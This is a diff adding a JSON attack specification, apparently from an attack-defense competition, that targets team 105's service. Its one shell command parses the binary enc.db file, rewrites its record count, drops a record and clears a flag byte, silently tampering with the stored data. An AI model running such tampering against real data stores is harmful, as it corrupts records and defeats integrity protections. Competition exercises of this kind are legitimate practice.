@@ -1,0 +1,13 @@
+{
+  "target_team": 105,
+  "type": "integrity",
+  "commands": [
+    {
+      "program": "sh",
+      "args": [
+        "-c",
+        "u32(){ od -An -tu4 -N4 -j \"$1\" enc.db | tr -d \" \"; }; u8(){ od -An -tu1 -N1 -j \"$1\" enc.db | tr -d \" \"; }; off=8; uc=$(u32 $off); off=$((off+4)); i=0; while [ $i -lt $uc ]; do l=$(u32 $off); off=$((off+4+l+16)); vl=$(u32 $off); off=$((off+4+vl)); i=$((i+1)); done; users_end=$off; fc=$(u32 $off); off=$((off+4)); rec1=$off; ol=$(u32 $off); off=$((off+4+ol)); nl=$(u32 $off); off=$((off+4+nl)); flagpos=$off; flag=$(u8 $off); off=$((off+1)); if [ \"$flag\" = \"1\" ]; then off=$((off+24)); cl=$(u32 $off); off=$((off+4+cl)); fi; { dd if=enc.db bs=1 count=$users_end 2>/dev/null; printf \"\\002\\000\\000\\000\"; dd if=enc.db bs=1 skip=$rec1 count=$((flagpos-rec1)) 2>/dev/null; printf \"\\000\"; dd if=enc.db bs=1 skip=$off 2>/dev/null; } > enc.new && mv enc.new enc.db"
+      ]
+    }
+  ]
+}
